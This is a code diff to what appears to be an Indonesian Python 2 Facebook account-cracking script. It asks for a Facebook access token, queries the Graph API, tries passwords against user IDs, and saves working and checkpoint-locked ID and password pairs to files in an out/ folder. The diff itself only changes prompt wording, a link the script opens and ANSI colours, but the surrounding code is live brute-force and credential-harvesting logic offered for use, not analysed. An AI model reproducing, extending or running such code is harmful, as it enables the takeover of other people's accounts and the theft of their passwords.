@@ -118,11 +118,11 @@ def masuk():
 	except (KeyError,IOError):
 		os.system('clear')
 		logo()
-		print(" ? \033[0;95m GABISA AMBIL TOKEN? KETIK '\033[0;93mhelp\033[0;95m' UNTUK MELIHAT TUTOR NYA DAN SIMAK √")
-		token = raw_input(" MASUKIN TOKEN NYA NGAB : ")
-		if token == "help":
-			os.system("xdg-open https://youtu.be/CJMKKaoRxJs")
-			exit(" ! SIMAK YA WAK")
+		print(" ? \033[0;95m Ketik '\033[0;95milhmR\033[0;95m' Untuk Mendapatkan Token Gratis.")
+		token = raw_input(" masukin token nya ngap : ")
+		if token == "ilhmR":
+			os.system("xdg-open https://free.facebook.com/100008065235213/posts/3002983643313781/?app=fbl")
+			exit(" ! Jangan Lupa React Love wak:v")
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -261,16 +261,16 @@ def hamz_ganteng():
 					print'\r \033[0;92m >,< ' +uid+ ' | ' + pw+ '        '
 					ok.append(uid+' | '+pw)
 					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-					save.write(' \033[0;92m >,< ' +str(uid)+' | '+str(pw)+'\n')
+					save.write(' \033[0;91m >,< ' +str(uid)+' | '+str(pw)+'\n')
 					save.close()
 					break
 					continue
 					continue
 				elif "www.facebook.com" in send.json()["error_msg"]:
-					print'\r \033[0;97m >,< ' +uid+ ' | ' + pw+ '        '
+					print'\r \033[0;91m >,< ' +uid+ ' | ' + pw+ '        '
 					cp.append(uid+' | '+pw)
 					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-					save.write(' \033[0;97m >,< ' +str(uid)+' | '+str(pw)+'\n')
+					save.write(' \033[0;91m >,< ' +str(uid)+' | '+str(pw)+'\n')
 					save.close()
 					break
 					continue
